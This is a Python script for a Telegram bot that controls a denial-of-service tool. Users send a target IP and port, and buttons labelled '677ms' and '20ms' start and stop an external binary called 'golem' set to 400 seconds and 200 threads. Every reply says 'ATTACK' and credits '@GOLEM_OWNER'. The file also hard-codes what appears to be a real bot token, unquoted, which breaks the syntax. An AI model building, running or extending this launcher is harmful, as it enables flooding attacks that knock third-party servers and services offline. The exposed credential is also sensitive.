import subprocess
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# Path to your binary
BINARY_PATH = "./golem"

# Global variables
process = None
target_ip = None
target_port = None
attack_time = 400  # Default time
threads = 200  # Default thread count

# Start command: Show Attack button
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("ATTACK")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("PRESS THE ATTACK BUTTON TO START CONFIGURING THE ATTACK.", reply_markup=reply_markup)

# Handle user input for IP and port
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    try:
        # User input is expected in the format: <target> <port>
        target, port = update.message.text.split()
        target_ip = target
        target_port = int(port)

        # Show Start, Stop, and Reset buttons after input is received
        keyboard = [
            [KeyboardButton("677ms"), KeyboardButton("20ms")],
            [KeyboardButton("RESET")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            f"TARGET IP: {target_ip}, PORT: {target_port}\nTIME: {attack_time}\nTHREADS: {threads}\nFILE DEVELOPER = @GOLEM_OWNER"
            "NOW CHOOSE AN ACTION:",
            reply_markup=reply_markup
        )
    except ValueError:
        await update.message.reply_text("Invalid format. Please enter in the format: <target> <port>")

# Start the attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time, threads
    if not target_ip or not target_port:
        await update.message.reply_text("Please configure the target and port first.")
        return

    if process and process.poll() is None:
        await update.message.reply_text("Attack is already running.")
        return

    try:
        # Run the binary with target, port, time, and threads
        process = subprocess.Popen(
            [BINARY_PATH, target_ip, str(target_port), str(attack_time), str(threads)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        await update.message.reply_text(f"STARTED ATTACK ON\n⚡TARGET IP⚡ {target_ip} ⚡TARGET PORT⚡ {target_port}\n⚡SECOND⚡{attack_time}\n⚡THREADS⚡{threads}\n\nFILE DEVELOPER = @GOLEM_OWNER")
    except Exception as e:
        await update.message.reply_text(f"ERROR STARTING ATTACK: {e}")

# Stop the attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    if not process or process.poll() is not None:
        await update.message.reply_text("NO ATTACK IS CURRENTLY RUNNING.")
        return

    process.terminate()
    process.wait()
    await update.message.reply_text("ATTACK STOPPED.\nFILE DEVELOPER = @GOLEM_OWNER")

# Reset the attack
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port
    if process and process.poll() is not None:
        process.terminate()
        process.wait()

    target_ip = None
    target_port = None
    await update.message.reply_text("ATTACK RESET. PLEASE CONFIGURE A NEW TARGET AND PORT.")

# Handle user actions for start/stop/reset
async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text

    if user_text == "677ms":
        await start_attack(update, context)
    elif user_text == "20ms":
        await stop_attack(update, context)
    elif user_text == "RESET":
        await reset_attack(update, context)
    else:
        # If the input doesn't match any action, treat it as input for IP and port
        await handle_input(update, context)

# Main function to start the bot
def main():
    # Your Telegram bot token
    TOKEN =7859939349:AAEIYhrRahmtJUQPjdMj2XSi-4XTTQJTCEU

    # Create Application object with your bot's token
    application = Application.builder().token(TOKEN).build()

    # Register command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register message handler for handling input and actions
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_action))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
